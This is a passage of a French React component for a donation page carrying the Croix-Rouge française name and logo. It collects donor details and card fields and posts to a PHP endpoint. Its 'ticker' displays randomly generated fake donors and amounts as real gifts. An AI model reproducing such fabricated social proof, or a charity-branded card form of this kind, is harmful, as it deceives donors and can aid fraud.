import React, { useEffect, useState, useRef } from "react";
import { Helmet } from "react-helmet";
import "intl-tel-input/build/css/intlTelInput.css";
import intlTelInput from "intl-tel-input";

// Importation des assets
import bouclier from "assets/images/donation/bouclier.svg";
import cartedecredit from "assets/images/donation/payment/carte-de-credit.svg";
import ggpayapppay from "assets/images/donation/payment/gg-pay-app-pay.svg";
import lacroixrouge from "assets/images/donation/lacroix-rouge.webm";
import logo from "assets/images/donation/Logo_Croix-Rouge_Française.svg";
import paypal from "assets/images/donation/payment/paypal.svg";
import virement from "assets/images/donation/payment/virement.svg";

import api from "@/api/axios";

async function submitDonation(payload) {
    try {
        const res = await api.post('/donation.php', payload);
        return res.data;
    } catch (error) {
        throw new Error(error.response?.data?.error || error.message || "Erreur serveur");
    }
}

export default function Donation() {
    // --- ÉTATS (States) ---

    const [activeTab, setActiveTab] = useState("once");
    const [selectedAmount, setSelectedAmount] = useState(null);
    const [customAmount, setCustomAmount] = useState("");
    const [deduction, setDeduction] = useState(0);
    const [showInfo, setShowInfo] = useState(false);
    const [activePayment, setActivePayment] = useState("card");
    const [showVirement, setShowVirement] = useState(false);
    const [donorText, setDonorText] = useState("");
    const [openAccordion, setOpenAccordion] = useState(null);

    // États du formulaire
    const [email, setEmail] = useState("");
    const [civilite, setCivilite] = useState("");
    const [prenom, setPrenom] = useState("");
    const [nom, setNom] = useState("");
    const [telephone, setTelephone] = useState("");
    const [adresse, setAdresse] = useState("");
    const [showManualAddress, setShowManualAddress] = useState(false);
    const [complementAdresse, setComplementAdresse] = useState("");
    const [codePostal, setCodePostal] = useState("");
    const [ville, setVille] = useState("");
    const [pays, setPays] = useState("FRANCE");
    const [dateNaissance, setDateNaissance] = useState("");

    // États Carte Bancaire
    const [cardNumber, setCardNumber] = useState("");
    const [cardExpiry, setCardExpiry] = useState("");
    const [cardCvc, setCardCvc] = useState("");

    const [errors, setErrors] = useState({});

    // Références pour les bibliothèques
    const itiRef = useRef(null);

    // --- LOGIQUE MÉTIER ---

    // Initialisation de intl-tel-input
    useEffect(() => {
        if (phoneInputRef.current) {
            itiRef.current = intlTelInput(phoneInputRef.current, {
                initialCountry: "fr",
                separateDialCode: true,
                utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@25.14.1/build/js/utils.js",
            });

            const handlePhoneInput = () => {
                if (itiRef.current) {
                    const fullNumber = itiRef.current.getNumber();
                    const rawValue = phoneInputRef.current?.value || "";
                    const finalValue = fullNumber || rawValue;

                    setTelephone(finalValue);

                    if (finalValue.trim()) {
                        setErrors(prev => {
                            const newErrors = { ...prev };
                            delete newErrors.telephone;
                            return newErrors;
                        });
                    }
                }
            };

            // Stocker la valeur actuelle de la ref pour s'assurer que le nettoyage fonctionne même si la ref change
            const phoneInput = phoneInputRef.current;

            // Écouter l'événement d'entrée standard et le changement de pays personnalisé
            phoneInput.addEventListener('input', handlePhoneInput);
            phoneInput.addEventListener('countrychange', handlePhoneInput);

            return () => {
                if (itiRef.current) {
                    phoneInput?.removeEventListener('input', handlePhoneInput);
                    phoneInput?.removeEventListener('countrychange', handlePhoneInput);
                    itiRef.current.destroy();
                }
            };
        }
    }, []); // Tableau de dépendances vide pour empêcher la réinitialisation

    // Calcul fiscal
    const calculerDeductionUnique = (montant) => {
        if (montant <= 1000) return montant * 0.75;
        const part75 = 1000 * 0.75;
        const part66 = (montant - 1000) * 0.66;
        return part75 + part66;
    };

    const calculerDeductionMensuelle = (montant) => {
        const annuel = montant * 12;
        const deductionTotale = calculerDeductionUnique(annuel);
        const mensuelApresDeduction = (annuel - deductionTotale) / 12;
        return mensuelApresDeduction;
    };

    // Ticker de donations

    useEffect(() => {
        const names = ["Claude", "Sophie", "Amine", "Léa", "Marc", "Emma", "Julien", "Nora", "Antoine", "Maya"];
        const amounts = [5, 10, 15, 20, 25, 50, 75, 100, 150, 200, 500];
        const messages = [
            (n, a) => `Merci à ${n} pour son don ${a}€ !`,
            (n, a) => `${n} vient de donner ${a}€ — merci !`,
            (n, a) => `Don reçu : ${a}€ de la part de ${n}.`
        ];

        const updateTicker = () => {
            const name = names[Math.floor(Math.random() * names.length)];
            const amount = amounts[Math.floor(Math.random() * amounts.length)];
            const template = messages[Math.floor(Math.random() * messages.length)];
            setDonorText(template(name, amount));
        };

        updateTicker();
        const interval = setInterval(updateTicker, 3500);
        return () => clearInterval(interval);
    }, []);

    // Gestion des onglets

    const handleTabChange = (tab) => {
        setActiveTab(tab);
        setSelectedAmount(null);
        setCustomAmount("");
        setShowInfo(false);
    };

    // Sélection montant fixe

    const handleAmountSelect = (amount) => {
        setSelectedAmount(amount);
        setCustomAmount("");
        const montantDeduit = activeTab === "monthly"
            ? calculerDeductionMensuelle(amount)
            : calculerDeductionUnique(amount);
        setDeduction(montantDeduit.toFixed(0));
        setShowInfo(true);
    };

    // Montant libre

    const handleCustomAmountChange = (value) => {
        setCustomAmount(value);
        setSelectedAmount(null);
        const montant = parseFloat(value);
        if (isNaN(montant) || montant <= 0) {
            setShowInfo(false);
            return;
        }
        const montantDeduit = activeTab === "monthly"
            ? calculerDeductionMensuelle(montant)
            : calculerDeductionUnique(montant);
        setDeduction(montantDeduit.toFixed(0));
        setShowInfo(true);
    };

    const normalizeAmount = (val) => {
        return val === "" ? 0 : parseFloat(val);
    };

    const handleIncrement = () => {
        const current = normalizeAmount(customAmount);
        handleCustomAmountChange((current + 1).toString());
    };

    const handleDecrement = () => {
        const current = normalizeAmount(customAmount);
        if (current > 1) {
            handleCustomAmountChange((current - 1).toString());
        }
    };

    // Paiement
    const handlePaymentChange = (method) => {
        setActivePayment(method);
        setShowVirement(method === "virement");
    };

    // Validation unitaire (onBlur)
    const handleBlur = (field, value) => {
        let error = null;
        switch (field) {
            case 'email':
                if (!value) error = "Vous devez saisir une adresse email valide";
                break;
            case 'civilite':
                if (!value) error = "La civilité est requise";
                break;
            case 'prenom':
                if (!value) error = "Vous devez saisir votre prénom";
                break;
            case 'nom':
                if (!value) error = "Vous devez saisir votre nom";
                break;
            case 'adresse':
                if (!value) error = "Vous devez saisir votre adresse";
                break;
            case 'codePostal':
                if (!value) error = "Vous devez saisir votre code postal";
                break;
            case 'ville':
                if (!value) error = "Vous devez saisir votre ville";
                break;
            case 'pays':
                if (!value) error = "Le pays est requis";
                break;
            case 'telephone':
                if (!value) error = "Le téléphone est requis";
                break;
            case 'dateNaissance':
                if (!value) error = "La date de naissance est requise";
                break;
            case 'cardNumber':
                if (!value) error = "Le numéro de carte est requis";
                break;
            case 'cardExpiry':
                if (!value) error = "La date d'expiration est requise";
                break;
            case 'cardCvc':
                if (!value) error = "Le CVC est requis";
                break;
            default:
                break;
        }

        setErrors(prev => ({
            ...prev,
            [field]: error
        }));
    };

    // Validation avec appel API
    const handleValidate = async () => {
        const amount = Number(customAmount || selectedAmount || 0);

        // Validation Champs Requis
        const newErrors = {};
        if (!email) newErrors.email = "Vous devez saisir une adresse email valide";
        if (!civilite) newErrors.civilite = "La civilité est requise";
        if (!prenom) newErrors.prenom = "Vous devez saisir votre prénom";
        if (!nom) newErrors.nom = "Vous devez saisir votre nom";
        if (!adresse) newErrors.adresse = "Vous devez saisir votre adresse";
        if (!codePostal) newErrors.codePostal = "Vous devez saisir votre code postal";
        if (!ville) newErrors.ville = "Vous devez saisir votre ville";
        if (!pays) newErrors.pays = "Le pays est requis";
        const combinedPhone = (phoneInputRef.current?.value || "") || (itiRef.current?.getNumber() || "") || telephone || "";
        if (!combinedPhone.trim()) {
            newErrors.telephone = "Le téléphone est requis";
        }
        if (!dateNaissance) newErrors.dateNaissance = "La date de naissance est requise";

        if (activePayment === "card") {
            if (!cardNumber) newErrors.cardNumber = "Le numéro de carte est requis";
            if (!cardExpiry) newErrors.cardExpiry = "La date d'expiration est requise";
            if (!cardCvc) newErrors.cardCvc = "Le CVC est requis";
        }

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            // Scroll au premier erreur
            const firstErrorField = document.querySelector('.error-input');
            if (firstErrorField) {
                firstErrorField.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
            return;
        }

        // Mini-check front
        if (!amount || amount <= 0) {
            alert("Veuillez choisir un montant.");
            return;
        }

        // Payload (aligné SQL)
        const payload = {
            donateur: {
                email,
                civilite,
                prenom,
                nom,
                telephone: telephone || null,
                adresse,
                complement_adresse: complementAdresse || null, // optionnel
                code_postal: codePostal,
                ville,
                pays,
                date_naissance: dateNaissance || null, // optionnel
            },
            don: {
                montant: amount,
                frequence: activeTab === "monthly" ? "monthly" : "once",
                moyen_paiement: activePayment,
            }
        };

        try {
            const data = await submitDonation(payload);
            // Message de succès avec numéro de donateur
            alert(`Merci pour votre don de ${amount}€ via ${activePayment} ❤️\nVotre numéro de donateur est : ${data.donor_number}`);
            console.log("Donation OK:", data);
        } catch (err) {
            console.error(err);
            alert(err.message || "Erreur serveur");
        }
    };

    // Accordéon Footer
    const toggleAccordion = (index) => {
        setOpenAccordion(openAccordion === index ? null : index);
    };

    const displayAmount = customAmount || selectedAmount || 0;

    return (
        <>
            <Helmet>
                <title>Soutenez la Croix-Rouge française</title>
                <meta name="description" content="Soutenez notre association en effectuant un don" />
                <meta property="og:title" content="Soutenez la Croix-Rouge française" />
                <meta property="og:description" content="Soutenez notre association en effectuant un don" />
            </Helmet>
            <Helmet>
                <title>Soutenez la Croix-Rouge française</title>
                <meta name="description" content="Soutenez notre association en effectuant un don" />
                <meta property="og:title" content="Soutenez la Croix-Rouge française" />
                <meta property="og:description" content="Soutenez notre association en effectuant un don" />
            </Helmet>

            <style>{`
                /* Donation Bar */
                :root {
                    --bar-bg-1: #e30219;
                    --bar-bg-2: #e30219;
                    --text-color: #ffffff;
                    --primary-color: #d40000;
                    --bg-color: #2d8f91;
                    --card-bg: #ffffff;
                }

                * {
                    box-sizing: border-box;
                }

                body {
                    margin: 0;
                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                    background: var(--bg-color);
                    color: #333;
                }

                /* Container Principal */
                .video-container {
                    position: relative;
                    width: 100%;
                    min-height: 100vh; /* Allow growth */
                    height: auto;
                    overflow-y: auto; /* Enable scroll */
                    overflow-x: hidden;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    padding-bottom: 0;
                }

                #background-video {
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    object-fit: cover;
                    z-index: -1;
                    pointer-events: none;
                }

                /* --- HEADER & LOGO --- */
                .header-donation {
                    width: 100%;
                    max-width: 1800px;
                    padding: 10px 20px;
                    margin-top: 60px; /* Espace barre fixe */
                    margin-bottom: 10px; /* Réduit pour gagner de la place */
                    position: relative;
                    display: flex;
                    justify-content: center; /* Centrer le titre */
                    align-items: center;
                    flex-shrink: 0; /* Prevent shrinking */
                }

                /* LOGO EN HAUT À GAUCHE */
                .logo-link {
                    position: absolute;
                    top: 0;
                    left: 0;
                    z-index: 20;
                }

                .logo {
                    width: 120px;
                    height: auto;
                    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
                    transition: transform 0.3s ease;
                }
                
                .logo:hover {
                    transform: scale(1.05);
                }

                /* TITRE ANIMÉ */
                .header-title-container {
                    text-align: center;
                    cursor: default;
                    transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                }

                .header-title-container:hover {
                    transform: scale(1.05); /* Animation "styler" au survol */
                }

                .header-donation h1 {
                    font-size: 2rem; /* Reduced from 2.8rem */
                    font-weight: 800;
                    margin: 0;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    flex-wrap: wrap;
                    gap: 0;
                    text-shadow: 0 4px 6px rgba(0,0,0,0.1);
                }

                .header-donation h1 .highlight {
                    background: linear-gradient(135deg, #d53c3c 0%, #b52c2c 100%);
                    color: #fff;
                    padding: 8px 16px; /* Reduced padding */
                    border-radius: 12px 0 0 12px;
                    box-shadow: 0 10px 20px rgba(213, 60, 60, 0.3);
                }

                .header-donation h1 .whitebox {
                    background: rgba(255, 255, 255, 0.98);
                    color: #000;
                    padding: 8px 16px; /* Reduced padding */
                    border-radius: 0 12px 12px 0;
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
                }

                /* --- DONATION BAR & TICKER --- */
                .donation-bar {
                    position: relative;
                    width: 100%;
                    top: 0;
                    left: 0;
                    right: 0;
                    background: linear-gradient(90deg, var(--bar-bg-1), #ff4d4d);
                    height: 48px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 1000;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                    color: #fff;
                    font-weight: 600;
                    font-size: 0.95rem;
                }

                /* ROULEAU VERTICAL (TICKER) */
                .ticker-container {
                    height: 24px;
                    overflow: hidden;
                    position: relative;
                    width: 100%;
                    max-width: 500px;
                    text-align: center;
    align-content: center;
                }

                /* Animation personnalisée pour faire défiler le texte de haut en bas */
                /* On utilise une animation keyframes JS-driven ou CSS simple. 
                   Ici on va animer l'apparition du texte à chaque changement via React key/state ou CSS.
                   Pour un "rouleau", l'effet slide-down est efficace.
                */
                .ticker-text {
                    display: block;
                    animation: slideDown 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
                }

                @keyframes slideDown {
                    0% {
                        transform: translateY(-100%);
                        opacity: 0;
                    }
                    100% {
                        transform: translateY(0);
                        opacity: 1;
                    }
                }

                /* --- MAIN SECTION (Responsive Hybrid) --- */
                .don-section {
                    display: flex;
                    flex-direction: column; /* Default: Stacked (Mobile/Laptop) */
                    align-items: center;
                    justify-content: flex-start;
                    gap: 20px;
                    width: 100%;
                    max-width: 1400px;
                    padding: 0 20px 40px;
                    z-index: 2;
                    flex-grow: 1;
                }

                /* CARTES COMMUNES */
                .don-module, .coordonnees-card, .reglement-card {
                    background: var(--card-bg);
                    border-radius: 16px;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
                    overflow: hidden;
                    width: 100%;
                    max-width: 500px; /* Max width when stacked */
                    flex-shrink: 0;
                    backdrop-filter: blur(10px);
                }

                .don-header, .card-header {
                    background: var(--primary-color);
                    color: #fff;
                    text-align: center;
                    padding: 12px 0; 
                    font-size: 1rem;
                    font-weight: 700;
                    letter-spacing: 0.5px;
                }

                .don-header h2, .card-header h2 { margin: 0; font-size: inherit; }

                /* --- TABS --- */
                .don-tabs {
                    display: flex;
                    background: #f0f2f5;
                    padding: 4px;
                    margin: 10px;
                    border-radius: 12px;
                    font-size: 1.2rem;
                }

               .acc-header {
    padding: 20px;
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: space-between; /* Align arrow to right */
    background: transparent;
    border: none;
    color: #fff;
    font-weight: 700;
    cursor: pointer;
    font-size: 1rem;
}
                .tab {
                    flex: 1;
                    padding: 10px 0;
                    border: none;
                    background: transparent;
                    color: #666;
                    font-weight: 600;
                    cursor: pointer;
                    border-radius: 10px;
                    transition: all 0.2s ease;
                }

                .tab.active {
                    background: #fff;
                    color: var(--primary-color);
                    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
                }

                /* --- AMOUNTS --- */
                .don-amounts {
                    padding: 20px;
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 12px;
                }

                .amount-don {
                    padding: 10px; /* Reduced padding */
                    border: 2px solid #eee;
                    border-radius: 12px;
                    background: #fff;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.2s;
                    font-size: 0.9rem; /* Reduced from 1rem */
                }

                .amount-don:hover {
                    border-color: var(--primary-color);
                    transform: translateY(-2px);
                }

                .amount-don.active {
                    background: var(--primary-color);
                    color: #fff;
                    border-color: var(--primary-color);
                    box-shadow: 0 4px 10px rgba(212, 0, 0, 0.3);
                }

                .custom-amount-box {
                    grid-column: 1 / -1;
                    display: flex;
                    align-items: center;
                    border: 2px solid #eee;
                    border-radius: 12px;
                    padding: 12px;
                    margin-top: 5px;
                    background: #fff;
                    transition: border-color 0.2s;
                }

                .custom-amount-box:focus-within {
                    border-color: var(--primary-color);
                }

                .custom-amount-input {
                    border: 2px solid #eee;
                    border-radius: 12px;
                    outline: none;
                    background: transparent;
                    flex: 1;
                    font-size: 1rem;
                    font-weight: 600;
                    color: #333;
                }

                .don-info {
                    background: #fff5f5;
                    color: #b52c2c;
                    padding: 15px;
                    font-size: 0.9rem;
                    line-height: 1.5;
                    border-top: 1px solid #ffebeb;
                }

                /* --- FORMULAIRE --- */
                .card-body { padding: 25px; }
                
                .form-group-donation { margin-bottom: 18px; }
                
                .form-group-donation label {
                    display: block;
                    margin-bottom: 4px; /* Reduced margin */
                    font-weight: 600;
                    font-size: 0.85rem; /* Reduced from 0.9rem */
                    color: #444;
                }

                /* Hide standard spinners */
                input[type=number]::-webkit-inner-spin-button, 
                input[type=number]::-webkit-outer-spin-button { 
                    -webkit-appearance: none; 
                    margin: 0; 
                }
                input[type=number] {
                    -moz-appearance: textfield;
                }

                input, select {
                    width: 100%;
                    padding: 12px; /* Match custom-amount-box padding */
                    border: 2px solid #eee; /* Match custom-amount-box border */
                    border-radius: 12px; /* Match custom-amount-box radius */
                    font-size: 0.9rem;
                    transition: border-color 0.2s, box-shadow 0.2s;
                    background: #fff; /* Match custom-amount-box background */
                    color: #333;
                }

                input:focus, select:focus {
                    background: #fff; /* Maintain white background on focus */
                    border-color: var(--primary-color);
                    box-shadow: 0 0 0 3px rgba(212, 0, 0, 0.1);
                    outline: none;
                }
                
                /* Validation Error Styles */
                .error-input {
                    border-color: #d40000 !important;
                    background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="%23d40000"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
                    background-repeat: no-repeat;
                    background-position: right 10px center;
                    padding-right: 35px; /* Espace pour l'icône */
                }

                .error-message {
                    color: #d40000;
                    font-size: 0.8rem;
                    margin-top: 5px;
                    display: block;
                    font-weight: 500;
                }

                /* ALIGNEMENT CHECKBOX GAUCHE */
                .form-group-donation-inline {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                    justify-content: flex-start; /* Gauche toute ! */
                    margin-bottom: 15px;
                    font-size: 1.2rem;
                }
                
                .form-group-donation-inline input[type="checkbox"] {
                    width: auto;
                    margin: 0;
                    cursor: pointer;
                }

                .form-row { display: flex; gap: 12px; }
                
                /* Accordéon adresse */
                .address-details-accordion {
                    max-height: 0;
                    overflow: hidden;
                    transition: max-height 0.4s ease-out, opacity 0.4s ease;
                    opacity: 0;
                }
                .address-details-accordion.open {
                    max-height: 600px;
                    opacity: 1;
                    margin-top: 15px;
                }

                /* --- PAIEMENT --- */
                .payment-methods {
                    padding: 15px; /* Reduced from 25px */
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 10px; /* Reduced from 15px */
                }

                .payment-option {
                    border: 2px solid #eee;
                    border-radius: 12px;
                    padding: 10px;
                    background: #fff;
                    cursor: pointer;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    height: 110px;
                    transition: all 0.2s;
                    position: relative;
                }

                .payment-option:hover {
                    border-color: var(--primary-color);
                    background: #fff5f5;
                }

                .payment-option.active {
                    border-color: var(--primary-color);
                    background: #fff5f5;
                    box-shadow: inset 0 0 0 1px var(--primary-color);
                }

                .payment-option.active::after {
                    content: "✓";
                    position: absolute;
                    top: 8px;
                    right: 8px;
                    color: var(--primary-color);
                    font-weight: 800;
                }

                .payment-option img.icon {
                    width: auto;
                    height: auto;
                    max-height: 50px; /* Limite la hauteur mais permet le ratio naturel */
                    max-width: 100%;
                    margin-bottom: 10px;
                    object-fit: contain;
                }
                
                .card-input-box{
                    padding: 15px; /* Reduced from 25px */
                }
                
                .validate-donation {
                    padding: 10px;
                    width: calc(100% - 30px); /* Adjusted width */
                    margin: 0 15px 15px; /* Reduced margins from 25px */
                    background: var(--primary-color);
                    color: #fff;
                    font-weight: 800;
                    font-size: 1rem; /* Reduced from 1.1rem */
                    border: none;
                    border-radius: 50px; /* Bouton arrondi moderne */
                    cursor: pointer;
                    transition: transform 0.2s, background 0.2s, box-shadow 0.2s;
                    box-shadow: 0 5px 15px rgba(212, 0, 0, 0.4);
                }

                .validate-donation:hover {
                    background: #b20000;
                    transform: translateY(-2px);
                    box-shadow: 0 8px 20px rgba(212, 0, 0, 0.5);
                }

                .secure-box {
                    background: #f0f2f5;
                    padding: 15px 25px;
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    font-size: 0.8rem;
                    color: #555;
                    border-top: 1px solid #eee;
                }

                /* --- FOOTER MODERNISÉ (RELATIVE, NO OVERLAP) --- */
                .don-footer {
                    position: relative; /* Changed from fixed */
                    bottom: 0;
                    left: 0;
                    width: 100%;
                    padding-bottom: 20px;
                    z-index: 50;
                    pointer-events: none; /* Laisse passer les clics autour */
                    margin-top: auto; /* Push to bottom */
                    background: transparent; /* Ensure no odd background blocking */
                }

                .footer-inner {
                    max-width: 1200px;
                    margin: 0 auto;
                    display: flex;
                    flex-direction: column; /* MOBILE DEFAULT: Stacked Accordion */
                    align-items: center;
                    justify-content: center;
                    gap: 15px;
                    pointer-events: auto; /* Réactive les clics sur les boutons */
                }

                /* Accordéon footer style "Bubble" Drop-up */
                .acc {
                    position: relative; /* Pour positionner le body en absolute */
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(5px);
                    border: 1px solid rgba(255,255,255,0.2);
                    border-radius: 16px;
                    width: 90%;
                    max-width: 500px;
                    transition: background 0.3s;
                }
                
                .acc:hover {
                    background: rgba(255, 255, 255, 0.2);
                }

                .acc-header {
                    padding: 20px;
                    width: 100%;
                    display: flex;
                    align-items: center;
                    background: transparent;
                    border: none;
                    color: #fff;
                    font-weight: 700;
                    cursor: pointer;
                    font-size: 1rem;
                }

                /* Animation d'ouverture VERS LE HAUT (Desktop) ou BAS (Mobile) */
                .acc-body {
                    position: relative; /* Mobile: Flow naturally (Down) */
                    bottom: auto;
                    left: 0;
                    width: 100%;
                    margin-top: 10px;
                    max-height: 0;
                    overflow: hidden;
                    transition: max-height 0.4s cubic-bezier(0.4, 0, 0.2, 1), padding 0.4s, opacity 0.4s;
                    background: rgba(0, 0, 0, 0.25);
                    border-radius: 16px;
                    border: 1px solid rgba(255,255,255,0.1);
                    opacity: 0;
                    z-index: 100;
                }

                .acc.open .acc-body {
                    max-height: 500px;
                    padding: 10px 0;
                    opacity: 1;
                }
                
                .acc.open .acc-caret {
                    transform: rotate(180deg);
                }

                .acc-list {
                    padding: 0 20px 0 40px;
                    margin: 0;
                    color: rgba(255,255,255,0.9);
                    font-size: 1.5rem;
                    line-height: 1.6;
                    list-style-type: disc;
                }

                .acc-list li {
                    margin-bottom: 10px;

                }

                /* RESPONSIVE DESKTOP (> 1500px w + 850px h) : Modules Side-by-Side but Scrollable/Relative */
                @media (min-width: 1500px) and (min-height: 850px) {
                    .video-container {
                        /* Unlock scroll: behave like mobile but wider */
                        height: auto;
                        min-height: 100vh;
                        overflow-y: auto; 
                        justify-content: flex-start; /* Flow from top */
                    }

                    /* Tighten vertical spacing for Desktop to fit screen */
                    .header-donation {
                        margin-top: 40px; 
                        margin-bottom: 50px; 
                        padding-top: 0;
                        padding-bottom: 0;
                    }
                    
                    .don-section {
                        flex-direction: row; /* Side by side modules */
                        align-items: flex-start;
                        justify-content: center;
                        padding-bottom: 40px; /* Reduced from 20px */
                        margin-top: auto; 
                        margin-bottom: auto;
                    }
                    
                    .don-module, .coordonnees-card, .reglement-card {
                        width: 360px;
                        max-width: none;
                    }
                    
                    /* Footer stays relative but items are row */
                    .don-footer {
                        position: relative; 
                        width: 100%;
                        margin-top: 0;
                    }

                    .footer-inner {
                        flex-direction: row; /* Side-by-side items */
                        align-items: flex-end;
                        gap: 20px;
                    }

                    /* Accordion body: Relative Drop-DOWN for desktop too */
                    .acc-body {
                        position: relative; /* Expand naturally pushing content down */
                        bottom: auto;
                        left: 0;
                        margin-bottom: 0;
                        margin-top: 10px;
                        background: rgba(0, 0, 0, 0.25);
                        box-shadow: none;
                    }

                    .acc {
                        width: 300px;
                    }
                }

                .payment-option-hidden {
                    display: none;
                }

                .iti {
                    display: block !important;
                    width: 100%;
                }

                .iti__selected-dial-code {
                    font-size: 1rem;
                }

            `}</style>

            <div className="video-container">
                <video autoPlay muted loop playsInline id="background-video">
                    <source src={lacroixrouge} type="video/webm" />
                </video>

                {/* Barre de donations */}
                <div className="donation-bar">
                    <div className="ticker-container">
                        {/* Clé changée pour relancer l'animation à chaque update du texte */}
                        <span key={donorText} className="ticker-text">{donorText}</span>
                    </div>
                </div>

                {/* Header */}
                <div className="header-donation">
                    <a href="/" className="logo-link">
                        <img src={logo} alt="Logo Croix-Rouge Française" className="logo" />
                    </a>

                    <div className="header-title-container">
                        <h1>
                            <span className="highlight">Votre Générosité</span>
                            <span className="whitebox">sauve des vies</span>
                        </h1>
                    </div>
                </div>

                {/* Section principale */}
                <section className="don-section">
                    {/* Bloc 1: Mon soutien */}
                    <section><section className="don-module">
                        <div className="don-header">
                            <h2>1. Mon soutien</h2>
                        </div>

                        <div className="don-tabs">
                            <button
                                className={`tab ${activeTab === "once" ? "active" : ""}`}
                                onClick={() => handleTabChange("once")}
                            >
                                Je donne une fois
                            </button>
                            <button
                                className={`tab ${activeTab === "monthly" ? "active" : ""}`}
                                onClick={() => handleTabChange("monthly")}
                            >
                                <span className="heart">❤</span> Je donne tous les mois
                            </button>
                        </div>

                        {activeTab === "once" && (
                            <div className="don-amounts">
                                {[90, 130, 150, 200].map(amount => (
                                    <button
                                        key={amount}
                                        className={`amount-don ${selectedAmount === amount ? "active" : ""}`}
                                        onClick={() => handleAmountSelect(amount)}
                                    >
                                        {amount} €
                                    </button>
                                ))}
                                <div style={{ gridColumn: '1 / -1', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <input
                                        type="number"
                                        className="custom-amount-input"
                                        placeholder="Autre montant"
                                        min="1"
                                        value={customAmount}
                                        style={{ paddingRight: '10px', width: 'auto', minWidth: '0' }}
                                        onChange={(e) => handleCustomAmountChange(e.target.value)}
                                    />
                                    <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                                        <button onClick={handleIncrement} style={{ background: '#eee', border: 'none', borderRadius: '4px', cursor: 'pointer', padding: '2px 6px', fontSize: '0.8rem', lineHeight: '1' }}>▲</button>
                                        <button onClick={handleDecrement} style={{ background: '#eee', border: 'none', borderRadius: '4px', cursor: 'pointer', padding: '2px 6px', fontSize: '0.8rem', lineHeight: '1' }}>▼</button>
                                    </div>
                                    <span className="euro-symbol" style={{ fontSize: '1.2rem', fontWeight: 'bold' }}>€</span>
                                </div>
                            </div>
                        )}

                        {activeTab === "monthly" && (
                            <div className="don-amounts">
                                {[10, 15, 20, 30].map(amount => (
                                    <button
                                        key={amount}
                                        className={`amount-don ${selectedAmount === amount ? "active" : ""}`}
                                        onClick={() => handleAmountSelect(amount)}
                                    >
                                        {amount} € /mois
                                    </button>
                                ))}
                                <div style={{ gridColumn: '1 / -1', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                    <input
                                        type="number"
                                        className="custom-amount-input"
                                        placeholder="Autre montant"
                                        min="1"
                                        value={customAmount}
                                        style={{ paddingRight: '10px', width: 'auto', minWidth: '0' }}
                                        onChange={(e) => handleCustomAmountChange(e.target.value)}
                                    />
                                    <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                                        <button onClick={handleIncrement} style={{ background: '#eee', border: 'none', borderRadius: '4px', cursor: 'pointer', padding: '2px 6px', fontSize: '0.8rem', lineHeight: '1' }}>▲</button>
                                        <button onClick={handleDecrement} style={{ background: '#eee', border: 'none', borderRadius: '4px', cursor: 'pointer', padding: '2px 6px', fontSize: '0.8rem', lineHeight: '1' }}>▼</button>
                                    </div>
                                    <span className="euro-symbol" style={{ fontSize: '1.2rem', fontWeight: 'bold' }}>€</span>
                                </div>
                            </div>
                        )}

                        {showInfo && (
                            <div className="don-info">
                                <p>Après déduction fiscale, votre don ne vous coûte que <strong>{deduction} €</strong>.</p>
                            </div>
                        )}
                    </section></section>

                    {/* Bloc 2: Mes coordonnées */}
                    <section className="don-coordonnees">
                        <div className="coordonnees-card">
                            <div className="card-header">
                                <h2>2. Mes coordonnées</h2>
                            </div>


                            <form className="card-body">
                                <div className="form-group-donation">
                                    <label htmlFor="email">Email *</label>
                                    <input
                                        type="email"
                                        id="email"
                                        value={email}
                                        onChange={(e) => { setEmail(e.target.value); if (errors.email) setErrors({ ...errors, email: null }); }}
                                        onBlur={(e) => handleBlur('email', e.target.value)}
                                        placeholder="exemple@email.com"
                                        className={errors.email ? "error-input" : ""}
                                        required
                                    />
                                    {errors.email && <span className="error-message">{errors.email}</span>}
                                </div>

                                <div className="form-group-donation-inline">
                                    <input type="checkbox" id="is-company" />
                                    <label htmlFor="is-company">Je suis une entreprise</label>
                                </div>

                                <div className="form-group-donation">
                                    <label htmlFor="civility">Civilité *</label>
                                    <select
                                        id="civility"
                                        value={civilite}
                                        onChange={(e) => { setCivilite(e.target.value); if (errors.civilite) setErrors({ ...errors, civilite: null }); }}
                                        onBlur={(e) => handleBlur('civilite', e.target.value)}
                                        className={errors.civilite ? "error-input" : ""}
                                        required
                                    >
                                        <option value="">Choisir...</option>
                                        <option value="Mme">Madame</option>
                                        <option value="M.">Monsieur</option>
                                        <option value="Autre">Autre</option>
                                    </select>
                                    {errors.civilite && <span className="error-message">{errors.civilite}</span>}
                                </div>

                                <div className="form-row">
                                    <div className="form-group-donation half">
                                        <label htmlFor="firstname">Prénom *</label>
                                        <input
                                            type="text"
                                            id="firstname"
                                            value={prenom}
